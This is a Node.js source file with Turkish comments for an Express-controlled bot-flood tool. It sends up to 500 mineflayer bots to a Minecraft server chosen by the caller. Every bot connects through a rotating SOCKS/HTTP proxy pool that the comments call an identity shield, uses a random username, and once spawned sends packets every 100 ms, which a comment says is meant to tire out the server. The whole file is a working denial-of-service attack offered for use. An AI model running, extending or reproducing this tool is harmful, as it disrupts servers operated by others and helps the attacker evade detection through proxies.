const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// 🛡️ VIP PROXY HAVUZU (Burayı çalışan güncel proxylerle doldur kanka)
const proxyList = [
    "socks5://ip:port", 
    "socks4://ip:port",
    "http://ip:port"
    // Ne kadar çok proxy, o kadar gizli kimlik!
];

let activeBots = [];

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[STEALTH MODE] Hedef: ${host}:${port} | 129GB RAM Ayrıldı.`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // ⏱️ HER 2 SANİYEDE BİR GİRİŞ (i * 2000ms)
        setTimeout(() => {
            const currentProxy = proxyList[i % proxyList.length];
            
            // Eğer proxy listesi boşsa hata vermemesi için kontrol
            if (!currentProxy) {
                console.log("!!! PROXY LISTESI BOS, IP ACIGA CIKABILIR !!!");
                return;
            }

            const agent = new ProxyAgent(currentProxy);

            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `Trgr_Vip_${Math.floor(Math.random() * 89999) + 10000}`,
                version: false,
                agent: agent, // IP KALKANI AKTİF
                hideErrors: true,
                connectTimeout: 60000
            });

            bot.on('login', () => {
                console.log(`[SECURE] ${bot.username} sızdı. (IP: ${currentProxy})`);
            });

            bot.on('spawn', () => {
                // Sunucuyu yormak için hafif ama sürekli paket gönderimi
                setInterval(() => {
                    if(bot.entity) {
                        bot.look(Math.random() * 360, 0);
                        bot.swingArm('right');
                    }
                }, 100);
            });

            bot.on('error', (err) => {
                console.log(`[!] Hata (Proxy kaynaklı olabilir): ${err.message}`);
            });

            activeBots.push(bot);
        }, i * 2000); // 👈 İSTEDİĞİN 2 SANİYE GECİKME BURADA
    }
    res.json({ success: true, message: "Hayalet Ordu 2 saniye aralıklarla sızmaya başladı!" });
});

app.post('/stop', (req, res) => {
    activeBots.forEach(b => b.quit());
    activeBots = [];
    res.json({ success: true, message: "Tüm bağlantılar güvenli şekilde kesildi." });
});

app.listen(process.env.PORT || 3000);
